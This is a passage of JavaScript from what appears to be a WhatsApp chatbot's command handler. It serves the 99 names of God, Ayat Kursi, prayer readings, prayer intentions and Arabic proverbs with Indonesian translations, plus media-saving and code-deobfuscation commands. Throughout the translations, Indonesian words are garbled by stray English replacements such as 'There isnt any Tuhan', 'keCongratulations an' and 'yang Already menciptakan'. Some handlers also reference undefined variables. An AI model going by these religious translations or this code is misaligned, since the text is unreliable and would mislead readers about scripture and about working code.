translation_id: "Yang Memiliki Mutlak sifat Maha Menyaksikan",
translation_en: "The Witness"
},
{
index: 51,
latin: "Al Haqq",
arabic: "الْحَقُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Benar",
translation_en: "The Truth, the Real"
},
{
index: 52,
latin: "Al Wakiil",
arabic: "الْوَكِيلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memelihara",
translation_en: "The Trustee, the Dependable"
},
{
index: 53,
latin: "Al Qawiyyu",
arabic: "الْقَوِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kuat",
translation_en: "The Strong"
},
{
index: 54,
latin: "Al Matiin",
arabic: "الْمَتِينُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Kokoh",
translation_en: "The Firm, the Steadfast"
},
{
index: 55,
latin: "Al Waliyy",
arabic: "الْوَلِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Melindungi",
translation_en: "The Protecting Friend, Patron, and Helper"
},
{
index: 56,
latin: "Al Hamiid",
arabic: "الْحَمِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Terpuji",
translation_en: "The All Praiseworthy"
},
{
index: 57,
latin: "Al Mushii",
arabic: "الْمُحْصِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengkalkulasi",
translation_en: "The Accounter, the Numberer of All"
},
{
index: 58,
latin: "Al Mubdi’",
arabic: "الْمُبْدِئُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memulai",
translation_en: "The Producer, Originator, and Initiator of all"
},
{
index: 59,
latin: "Al Mu’iid",
arabic: "الْمُعِيدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMengembalikan Kehidupan",
translation_en: "The Reinstater Who Brings Back All"
},
{
index: 60,
latin: "Al Muhyii",
arabic: "الْمُحْيِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Menghidupkan",
translation_en: "The Giver of Life"
},
{
index: 61,
latin: "Al Mumiitu",
arabic: "اَلْمُمِيتُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mematikan",
translation_en: "The Bringer of Death, the Destroyer"
},
{
index: 62,
latin: "Al Hayyu",
arabic: "الْحَيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Hidup",
translation_en: "The Ever Living"
},
{
index: 63,
latin: "Al Qayyuum",
arabic: "الْقَيُّومُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mandiri",
translation_en: "The Self Subsisting Sustainer of All"
},
{
index: 64,
latin: "Al Waajid",
arabic: "الْوَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penemu",
translation_en: "The Perceiver, the Finder, the Unfailing"
},
{
index: 65,
latin: "Al Maajid",
arabic: "الْمَاجِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mulia",
translation_en: "The Illustrious, the Magnificent"
},
{
index: 66,
latin: "Al Wahiid",
arabic: "الْواحِدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Tunggal",
translation_en: "The One, The Unique, Manifestation of Unity"
},
{
index: 67,
latin: "Al ‘Ahad",
arabic: "اَلاَحَدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Esa",
translation_en: "The One, the All Inclusive, the Indivisible"
},
{
index: 68,
latin: "As Shamad",
arabic: "الصَّمَدُ",
translation_id: "Yang Memiliki Mutlak sifat MahaDibutuhkan, Tempat Meminta",
translation_en: "The Self Sufficient, the Impregnable,the Eternally Besought of All, the Everlasting"
},
{
index: 69,
latin: "Al Qaadir",
arabic: "الْقَادِرُ",
translation_id: "Yang Memiliki Mutlak sifat MahaMenentukan, Maha Menyeimbangkan",
translation_en: "The All Able"
},
{
index: 70,
latin: "Al Muqtadir",
arabic: "الْمُقْتَدِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkuasa",
translation_en: "The All Determiner, the Dominant"
},
{
index: 71,
latin: "Al Muqaddim",
arabic: "الْمُقَدِّمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mendahulukan",
translation_en: "The Expediter, He who brings forward"
},
{
index: 72,
latin: "Al Mu’akkhir",
arabic: "الْمُؤَخِّرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengakhirkan",
translation_en: "The Delayer, He who puts far away"
},
{
index: 73,
latin: "Al Awwal",
arabic: "الأوَّلُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Awal",
translation_en: "The First"
},
{
index: 74,
latin: "Al Aakhir",
arabic: "الآخِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Akhir",
translation_en: "The Last"
},
{
index: 75,
latin: "Az Zhaahir",
arabic: "الظَّاهِرُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Nyata",
translation_en: "The Manifest; the All Victorious"
},
{
index: 76,
latin: "Al Baathin",
arabic: "الْبَاطِنُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Ghaib",
translation_en: "The Hidden; the All Encompassing"
},
{
index: 77,
latin: "Al Waali",
arabic: "الْوَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memerintah",
translation_en: "The Patron"
},
{
index: 78,
latin: "Al Muta’aalii",
arabic: "الْمُتَعَالِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Tinggi",
translation_en: "The Self Exalted"
},
{
index: 79,
latin: "Al Barri",
arabic: "الْبَرُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penderma",
translation_en: "The Most Kind and Righteous"
},
{
index: 80,
latin: "At Tawwaab",
arabic: "التَّوَابُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penerima Tobat",
translation_en: "The Ever Returning, Ever Relenting"
},
{
index: 81,
latin: "Al Muntaqim",
arabic: "الْمُنْتَقِمُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Penuntut Balas",
translation_en: "The Avenger"
},
{
index: 82,
latin: "Al Afuww",
arabic: "العَفُوُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemaaf",
translation_en: "The Pardoner, the Effacer of Sins"
},
{
index: 83,
latin: "Ar Ra`uuf",
arabic: "الرَّؤُوفُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pengasih",
translation_en: "The Compassionate, the All Pitying"
},
{
index: 84,
latin: "Malikul Mulk",
arabic: "مَالِكُ الْمُلْكِ",
translation_id: "Yang Memiliki Mutlak sifatPenguasa Kerajaan (Semesta)",
translation_en: "The Owner of All Sovereignty"
},
{
index: 85,
latin: "Dzul JalaaliWal Ikraam",
arabic: "ذُوالْجَلاَلِوَالإكْرَامِ",
translation_id: "Yang Memiliki Mutlak sifat PemilikKebesaran dan Kemuliaan",
translation_en: "The Lord of Majesty and Generosity"
},
{
index: 86,
latin: "Al Muqsith",
arabic: "الْمُقْسِطُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Adil",
translation_en: "The Equitable, the Requiter"
},
{
index: 87,
latin: "Al Jamii’",
arabic: "الْجَامِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mengumpulkan",
translation_en: "The Gatherer, the Unifier"
},
{
index: 88,
latin: "Al Ghaniyy",
arabic: "الْغَنِيُّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Berkecukupan",
translation_en: "The All Rich, the Independent"
},
{
index: 89,
latin: "Al Mughnii",
arabic: "الْمُغْنِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Kekayaan",
translation_en: "The Enricher, the Emancipator"
},
{
index: 90,
latin: "Al Maani",
arabic: "اَلْمَانِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Mencegah",
translation_en: "The Withholder, the Shielder, the Defender"
},
{
index: 91,
latin: "Ad Dhaar",
arabic: "الضَّارَّ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Derita",
translation_en: "The Distressor, the Harmer"
},
{
index: 92,
latin: "An Nafii’",
arabic: "النَّافِعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Memberi Manfaat",
translation_en: "The Propitious, the Benefactor"
},
{
index: 93,
latin: "An Nuur",
arabic: "النُّورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Bercahaya(Menerangi, Memberi Cahaya)",
translation_en: "The Light"
},
{
index: 94,
latin: "Al Haadii",
arabic: "الْهَادِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Pemberi Petunjuk",
translation_en: "The Guide"
},
{
index: 95,
latin: "Al Baadii",
arabic: "الْبَدِيعُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pencipta",
translation_en: "Incomparable, the Originator"
},
{
index: 96,
latin: "Al Baaqii",
arabic: "اَلْبَاقِي",
translation_id: "Yang Memiliki Mutlak sifat Maha Kekal",
translation_en: "The Ever Enduring and Immutable"
},
{
index: 97,
latin: "Al Waarits",
arabic: "الْوَارِثُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pewaris",
translation_en: "The Heir, the Inheritor of All"
},
{
index: 98,
latin: "Ar Rasyiid",
arabic: "الرَّشِيدُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Pandai",
translation_en: "The Guide, Infallible Teacher, and Knower"
},
{
index: 99,
latin: "As Shabuur",
arabic: "الصَّبُورُ",
translation_id: "Yang Memiliki Mutlak sifat Maha Sabar",
translation_en: "The Patient"
}
]
let json = JSON.parse(JSON.stringify(asmaulhusna))
let data = json.map((v, i) => `${i + 1}. ${v.latin}\n${v.arabic}\n${v.translation_id}`).join('\n\n')
if (isNaN(args[0])) return reply(`Example:\nasmaulhusna 1`)
if (args[0]) {
if (args[0] < 1 || args[0] > 99) throw `minimal 1 & Maximum 99!`
let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
return reply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
`.trim())
}
reply(`${Example} + ${data} + ${anjuran}`)
}
break

 
case 'save': {
    if (!isCreator) return Owner();
    try {
        let mediaType;
        if (/video/.test(mime)) {
            mediaType = 'video';
        } else if (/image/.test(mime)) {
            mediaType = 'image';
        } else if (/audio/.test(mime)) {
            mediaType = 'audio';
        } else {
            return reply('Reply to a Video, Image, or Audio Status');
        }

        var mediaFile = await ptz.downloadAndSaveMediaMessage(quoted);
        let messageOptions = {
            caption: q ? q : ''
        };

        // Assign the correct media type to messageOptions
        messageOptions[mediaType] = {
            url: mediaFile
        };

        await ptz.sendMessage(m.sender, messageOptions, { quoted: m });
        await reply('`Done`');
    } catch (error) {
        console.error(error);
        reply('Failed to save and send the media.');
    }
    break;
}




case 'decrypt': {
let teks
if (m.quoted) {
teks = m.quoted ? m.quoted.text : text
} else if (text) {
teks = text ? text : text
} else return reply(`Masukan codenya!`)
try {
       const webcrack = require('webcrack');
let result = await webcrack(teks);
reply(result.code)
} catch (e) {
console.log(e)
reply("Error!!")
}
}
break 

case 'ayatkursi': {
let caption = `
*${m2}「 Ayat Kursi 」${m2}*

اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ
“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”
Artinya:
Allah, There isnt any Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi Continue menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
(QS. Al Baqarah: 255)
`.trim()
reply(caption)
}
break

case 'bacaansholat': {
const bacaanshalat = {
"result": [
{
 "id": 1,
 "name": "Bacaan Iftitah",
 "arabic": "اللَّهُ أَكْبَرُ كَبِيرًا وَالْحَمْدُ لِلَّهِ كَثِيرًا وَسُبْحَانَ اللَّهِ بُكْرَةً وَأَصِيلاً , إِنِّى وَجَّهْتُ وَجْهِىَ لِلَّذِى فَطَرَ السَّمَوَاتِ وَالأَرْضَ حَنِيفًا وَمَا أَنَا مِنَ الْمُشْرِكِينَ إِنَّ صَلاَتِى وَنُسُكِى وَمَحْيَاىَ وَمَمَاتِى لِلَّهِ رَبِّ الْعَالَمِينَ لاَ شَرِيكَ لَهُ وَبِذَلِكَ أُمِرْتُ وَأَنَا أَوَّلُ الْمُسْلِمِينَ",
 "latin": "Alloohu akbar kabiirow wal hamdu lillaahi katsiiroo wasubhaanalloohi bukrotaw wa-ashiilaa, Innii wajjahtu wajhiya lilladzii fathoros samaawaati wal ardlo haniifaa wamaa ana minal musyrikiin. Inna sholaatii wa nusukii wamahyaa wa mamaatii lillaahi robbil &lsquo;aalamiin. Laa syariikalahu wa bidzaalika umirtu wa ana awwalul muslimiin",
 "terjemahan": "Allah Maha Besar dengan sebesar-besarnya, segala puji bagi Allah dengan pujian yang banyak. Mahasuci Allah pada waktu pagi dan petang, Sesungguhnya aku hadapkan wajahku kepada Allah yang Already menciptakan langit dan bumi dalam keadaan tunduk dan aku bukanlah dari golongan orang-orang musyrik. Sesungguhnya shalatku, sembelihanku, hidupku dan matiku hanya untuk Allah Tuhan semesta alam. There isnt any sekutu bagiNya. Dan dengan yang demikian itu lah aku diperintahkan. Dan aku adalah orang yang pertama berserah diri"
},
{
 "id": 2,
 "name": "Al Fatihah",
 "arabic": "بِسْمِ اللَّـهِ الرَّحْمَـٰنِ الرَّحِيمِ ﴿١﴾الْحَمْدُ لِلَّـهِ رَبِّ الْعَالَمِينَ ﴿٢﴾ الرَّحْمَـٰنِ الرَّحِيمِ ﴿٣﴾ مَالِكِ يَوْمِ الدِّينِ ﴿٤﴾ إِيَّاكَ نَعْبُدُ وَإِيَّاكَ نَسْتَعِينُ ﴿٥﴾ اهْدِنَاالصِّرَاطَ الْمُسْتَقِيمَ ﴿٦﴾ صِرَاطَ الَّذِينَ أَنْعَمْتَ عَلَيْهِمْ غَيْرِ الْمَغْضُوبِ عَلَيْهِمْ وَلَا الضَّالِّينَ ﴿٧",
 "latin": "1. Bismillahirrahmanirrahim, 2. Alhamdulillahi rabbil alamin, 3. Arrahmaanirrahiim, 4. Maaliki yaumiddiin, 5. Iyyaka nabudu waiyyaaka nastaiin, 6. Ihdinashirratal mustaqim, 7. shiratalladzina an&rsquo;amta alaihim ghairil maghduubi alaihim waladhaalin",
 "terjemahan": "1. Dengan menyebut nama Allah Yang Maha Pemurah lagi Maha Penyayang, 2. Segala puji bagi Allah, Tuhan semesta alam, 3. Maha Pemurah lagi Maha Penyayang, 4. Yang menguasai di Hari Pembalasan, 5. Hanya Engkaulah yang kami sembah, dan hanya kepada Engkaulah kami meminta pertolongan, 6. Tunjukilah kami jalan yang lurus, 7. (yaitu) Jalan orang-orang yang Already Engkau beri nikmat kepada mereka; bukan (jalan) mereka yang dimurkai dan bukan (pula jalan) mereka yang sesat"
},
{
 "id": 3,
 "name": "Bacaan Ruku",
 "arabic": "(3x) سُبْحَانَ رَبِّيَ الْعَظِيْمِ وَبِحَمْدِهِ",
 "latin": "Subhana Rabbiyal Adzimi Wabihamdih (3x)",
 "terjemahan": "Maha Suci Tuhanku Yang Maha Agung Dan Dengan Memuji-Nya"
},
{
 "id": 4,
 "name": "Bacaan Sujud",
 "arabic": "(3x) سُبْحَانَ رَبِّىَ الْأَعْلَى وَبِحَمْدِهِ",
 "latin": "Subhaana robbiyal a'la wabihamdih (3x)",
 "terjemahan": "Mahasuci Tuhanku yang Mahatinggi dan segala puji bagiNya"
},
{
 "id": 5,
 "name": "Bacaan Duduk Diantara Dua Sujud",
 "arabic": "رَبِّ اغْفِرْلِيْ وَارْحَمْنِيْ وَاجْبُرْنِيْ وَارْفَعْنِيْ وَارْزُقْنِيْ وَاهْدِنِيْ وَعَافِنِيْ وَاعْفُ عَنِّيْ",
 "latin": "Rabbighfirli Warhamni Wajburnii Warfaknii Wazuqnii Wahdinii Wa'aafinii Wa'fuannii",
 "terjemahan": "Ya Allah,ampunilah dosaku,belas kasihinilah aku dan cukuplah segala kekuranganku da angkatlah derajatku dan berilah rezeki kepadaku,dan berilah aku petunjuk dan berilah kesehatan padaku dan berilah ampunan kepadaku"
},
{
 "id": 6,
 "name": "Duduk Tasyahud Awal",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahummasholli ala Sayyidina Muhammad",
 "terjemahan": "Segala penghormatan, keberkahan, shalawat dan kebaikan hanya bagi Allah. Semoga salam sejahtera selalu tercurahkan kepadamu wahai Nabi, demikian pula rahmat Allah dan berkahNya dan semoga salam sejahtera selalu tercurah kepada kami dan hamba-hamba Allah yang shalih. Aku bersaksi bahwa tiada ilah kecuali Allah dan aku bersaksi bahwa Muhammad adalah utusan Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad"
},
{
 "id": 7,
 "name": "Duduk Tasyahud Akhir",
 "arabic": "اَلتَّحِيَّاتُ الْمُبَارَكَاتُ الصَّلَوَاتُ الطَّيِّبَاتُ ِللهِ، السَّلاَمُ عَلَيْكَ اَيُّهَا النَّبِيُّ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ، السَّلاَمُ عَلَيْنَا وَعَلَى عِبَادِاللهِ الصَّالِحِيْنَ، أَشْهَدُ اَنْ لآ إِلَهَ إِلاَّاللهُ وَاَشْهَدُ أَنَّ مُحَمَّدًا رَسُوْلُ اللهُ، اَللهُمَّ صَلِّ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ، كَمَا صَلَّيْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ وَبَارِكْ عَلَى سَيِّدِنَا مُحَمَّدٍ وَعَلَى آلِ سَيِّدِنَا مُحَمَّدٍ كَمَا بَرَكْتَ عَلَى سَيِّدِنَا اِبْرَاهِيْمَ وَعَلَى آلِ سَيِّدِنَا اِبْرَاهِيْمَ فِى الْعَالَمِيْنَ إِنَّكَ حَمِيْدٌ مَجِيْدٌ",
 "latin": "Attahiyyaatul mubaarokaatush sholawaatuth thoyyibaatu lillaah. Assalaamualaika ayyuhan nabiyyu wa rohmatulloohi wa barokaatuh. Assalaaamualainaa wa alaa ibaadillaahish shoolihiin. Asyhadu allaa ilaaha illallooh wa asyhadu anna Muhammadar rosuulullooh. Allahumma Shalli Ala Sayyidina Muhammad Wa Ala Ali Sayyidina Muhammad. Kama Shollaita Ala Sayyidina Ibrahim wa alaa aali sayyidina Ibrahim, wabaarik ala Sayyidina Muhammad Wa Alaa Ali Sayyidina Muhammad, Kama barokta alaa Sayyidina Ibrahim wa alaa ali Sayyidina Ibrahim, Fil aalamiina innaka hamiidummajid",
 "terjemahan": "Segala penghormatan yang berkat solat yang baik adalah untuk Allah. Sejahtera atas engkau wahai Nabi dan rahmat Allah serta keberkatannya. Sejahtera ke atas kami dan atas hamba-hamba Allah yang soleh. Aku bersaksi bahwa tiada Tuhan melainkan Allah dan aku bersaksi bahwasanya Muhammad itu adalah pesuruh Allah. Ya Tuhan kami, selawatkanlah ke atas Nabi Muhammad dan ke atas keluarganya. Sebagaimana Engkau selawatkan ke atas Ibrahim dan atas keluarga Ibrahim. Berkatilah ke atas Muhammad dan atas keluarganya sebagaimana Engkau berkati ke atas Ibrahim dan atas keluarga Ibrahim di dalam alam ini. Sesungguhnya Engkau Maha Terpuji lagi Maha Agung"
},
{
 "id": 8,
 "name": "Salam",
 "arabic": "اَلسَّلاَمُ عَلَيْكُمْ وَرَحْمَةُ اللهِ وَبَرَكَاتُهُ",
 "latin": "Assalamualaikum Warohmatullahi Wabarokatuh",
 "terjemahan": "Semoga keCongratulations an, rohmat dan berkah ALLAH selalu tercurah untuk You sekalian."
}
]
}
let bacaan = JSON.stringify(bacaanshalat)
let json = JSON.parse(bacaan)
let data = json.result.map((v, i) => `${i + 1}. ${v.name}\n${v.arabic}\n${v.latin}\n*It means:*\n_"${v.terjemahan}"_`).join('\n\n')
let Example = `*${m2}「 Prayer Readings 」${m2}*\n\n`
reply(`${Example} + ${data}`)
}
break

case 'doaharian': {
let src = JSON.parse(fs.readFileSync('./lib/doaharian.json', 'utf-8'))
let caption = src.map((v, i) => {
return `
*${i + 1}.* ${v.title}

•°• Latin :
${v.latin}

•°• Arabic :
${v.arabic}

•°• Translate :
${v.translation}
`.trim()
}).join('\n\n')
reply(`${caption}`)
}
break

case 'niatsholat': {
if (!q) return reply(`Example Usage :\nniatsholat Subuh`)
const niatsholat = [
{
index: 1,
solat: "subuh",
latin: "Ushalli fardhosh shubhi rok'ataini mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الصُّبْحِ رَكْعَتَيْنِ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Shubuh dua raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 2,
solat: "maghrib",
latin: "Ushalli fardhol maghribi tsalaata raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الْمَغْرِبِ ثَلاَثَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Maghrib tiga raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 3,
solat: "dzuhur",
latin: "Ushalli fardhodl dhuhri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "اُصَلِّى فَرْضَ الظُّهْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Dzuhur empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 4,
solat: "isha",
latin: "Ushalli fardhol 'isyaa-i arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعِشَاءِ اَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu Isya empat raka'at menghadap kiblat karena Allah Ta'ala",
},
{
index: 5,
solat: "ashar",
latin: "Ushalli fardhol 'ashri arba'a raka'aatim mustaqbilal qiblati adaa-an lillaahi ta'aala",
arabic: "صَلِّى فَرْضَ الْعَصْرِاَرْبَعَ رَكَعَاتٍ مُسْتَقْبِلَ الْقِبْلَةِ اَدَاءً ِللهِ تَعَالَى",
translation_id: "Aku berniat shalat fardhu 'Ashar empat raka'at menghadap kiblat karena Allah Ta'ala",
}
]
let text = q.toLowerCase() || ''
let data = Object.values(niatsholat).find(v => v.solat == text)
if (!data) return reply(`*${m2}( ${txt} Tidak Ditemukan )${m2}*\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
reply(`
*${m2}Niat Sholat ${text}${m2}*

*Arab :* ${data.arabic}

*Latin :* ${data.latin} 

*Translate :* ${data.translation_id}`.trim())
}
break

case 'quotesislami': {
const islami = [
{
 "id": "1",
 "arabic": "مَنْ سَارَ عَلىَ الدَّرْبِ وَصَلَ",
 "arti": "Barang siapa berjalan pada jalannya, maka dia akan sampai (pada tujuannya)."
},
{
 "id": "2",
 "arabic": "مَنْ صَبَرَ ظَفِرَ",
 "arti": "Barang siapa bersabar, maka dia akan beruntung."
},
{
 "id": "3",
 "arabic": "مَنْ جَدَّ وَجَـدَ",
 "arti": "Barang siapa bersungguh-sungguh, maka dia akan meraih (keSuccessan)."
},
{
 "id": "4",
 "arabic": "جَالِسْ أَهْلَ الصِّدْقِ وَالوَفَاءِ",
 "arti": "Bergaulah bersama orang-orang yang jujur dan menepati janji."
},
{
 "id": "5",
 "arabic": "مَنْ قَلَّ صِدْقُهُ قَلَّ صَدِيْقُهُ",
 "arti": "Barang siapa sedikit kejujurannya, maka sedikit pulalah temannya."
},
{
 "id": 6,
 "arabic": "مَوَدَّةُ الصَّدِيْقِ تَظْهَرُ وَقْتَ الضِّيْقِ",
 "arti": "Kecintaan seorang teman itu akan terlihat pada waktu kesempitan."
},
{
 "id": "7",
 "arabic": "الصَّبْرُ يُعِيْنُ عَلَى كُلِّ عَمَلٍ",
 "arti": "Kesabaran akan menolong segala pekerjaan."
},
{
 "id": "8",
 "arabic": "وَمَا اللَّذَّةُ إِلاَّ بَعْدَ التَّعَبِ",
 "arti": "There isnt any kenikmatan kecuali seAlready kepayahan."
},
{
 "id": "9",
 "arabic": "جَرِّبْ وَلاَحِظْ تَكُنْ عَارِفًا",
 "arti": "Coba dan perhatikanlah, maka engkau akan menjadi orang yang tahu."
},
{
 "id": "10",
 "arabic": "بَيْضَةُ اليَوْمِ خَيْرٌ مِنْ دَجَاجَةِ الغَدِ",
 "arti": "Telur hari ini lebih baik daripada ayam esok hari."
},
{
 "id": "11",
 "arabic": "أُطْلُبِ الْعِلْمَ مِنَ الْمَهْدِ إِلَى الَّلحْدِ",
 "arti": "Carilah ilmu sejak dari buaian hingga liang lahat."
},
{
 "id": "12",
 "arabic": "الوَقْتُ أَثْمَنُ مِنَ الذَّهَبِ",
 "arti": "Waktu itu lebih berharga daripada emas."
},
{
 "id": "13",
 "arabic": "لاَ خَيْرَ فيِ لَذَّةٍ تَعْقِبُ نَدَماً",
 "arti": "Tak ada kebaikan bagi kenikmatan yang diiringi dengan penyesalan."
},
{
 "id": "14",
 "arabic": "أَخِي لَنْ تَنَالَ العِلْمَ إِلاَّ بِسِتَّةٍ سَأُنْبِيْكَ عَنْ تَفْصِيْلِهَا بِبَيَانٍ: ذَكَاءٌ وَحِرْصٌ وَاجْتِهَادٌ وَدِرْهَمٌ وَصُحْبَةُ أُسْتَاذٍ وَطُوْلُ زَمَانٍ",
 "arti": "Wahai saudaraku, Kamu tidak akan memperoleh ilmu kecuali dengan enam perkara, akan aku sampaikan rinciannya dengan jelas; 1) Kecerdasan, 2) Ketamaan (terhadap ilmu), 3) Kesungguhan, 4) Harta benda (sebagai bekal), 5) Bergaul dengan guru, 6) Waktu yang lama."
},
{
 "id": "15",
 "arabic": "لاَ تَكُنْ رَطْباً فَتُعْصَرَ وَلاَ يَابِسًا فَتُكَسَّرَ",
 "arti": "Janganlah kamu bersikap lemah, sehingga kamu mudah diperas. Dan janganlah kamu bersikap keras, sehingga kamu mudah dipatahkan."
},
{
 "id": "16",
 "arabic": "لِكُلِّ مَقَامٍ مَقَالٌ وَلِكُلِّ مَقَالٍ مَقَامٌ",
 "arti": "Setiap tempat memiliki perkataannya masing-masing, dan setiap perkataan memiliki tempatnya masing-masing."
},{
 "id": "17",
 "arabic": "خَيْرُ النَّاسِ أَحْسَنُهُمْ خُلُقاً وَأَنْفَعُهُمْ لِلنَّاسِ",
 "arti": "Sebaik-baik manusia adalah yang paling baik budi pekertinya dan yang paling bermanfaat bagi manusia lainnya."
},
{
 "id": "18",
 "arabic": "خَيْرُ جَلِيْسٍ في الزّمانِ كِتابُ",
 "arti": "Sebaik-baik teman duduk di setiap waktu adalah buku."
},
{
 "id": "19",
 "arabic": "مَنْ يَزْرَعْ يَحْصُدْ",
 "arti": "Barang siapa menanam, pasti ia akan memetik (mengetam)."
},
{
 "id": "20",
 "arabic": "لَوْلاَ العِلْمُ لَكَانَ النَّاسُ كَالبَهَائِمِ",
 "arti": "Kalaulah tidak karena ilmu, niscaya manusia itu seperti binatang."
},
{
 "id": "21",
 "arabic": "سَلاَمَةُ الإِنْسَانِ فيِ حِفْظِ اللِّسَانِ",
 "arti": "KeCongratulations an manusia itu terletak pada penjagaan lidahnya (perkataannya)."
},
{
 "id": "22",
 "arabic": "الرِّفْقُ بِالضَّعِيْفِ مِنْ خُلُقِ الشَّرِيْفِ",
